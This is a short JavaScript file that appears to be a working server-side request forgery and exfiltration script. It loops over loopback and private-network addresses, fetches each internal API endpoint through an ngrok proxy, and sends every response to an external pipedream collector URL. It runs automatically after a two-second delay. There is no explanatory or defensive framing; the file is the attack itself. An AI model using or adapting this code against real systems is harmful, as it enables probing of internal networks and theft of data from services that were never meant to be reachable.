const localIps = [
    "http://127.0.0.1/api.php",
    "http://localhost/api.php",
    "http://[::1]/api.php",
    "http://192.168.0.1/api.php",
    "http://192.168.1.1/api.php",
    "http://10.0.0.1/api.php",
    "http://10.0.1.1/api.php"
];

const proxyUrl = "https://e2cd-92-149-40-183.ngrok-free.app/proxy?url=";

function fetchInternalAPI() {
    console.log("Function called");
    localIps.forEach(ip => {
        
        const targetUrl = proxyUrl + encodeURIComponent(ip);
        fetch(targetUrl)
            .then(response => response.text())
            .then(data => {
                console.log(`Resp from ${ip} via proxy:`, data);

                
                fetch("https://enltk7c15ubn.x.pipedream.net/?data=" + encodeURIComponent(data));
            })
            .catch(error => console.error(`Error fetching ${ip} via proxy:`, error));
    });
}

setTimeout(fetchInternalAPI, 2000);
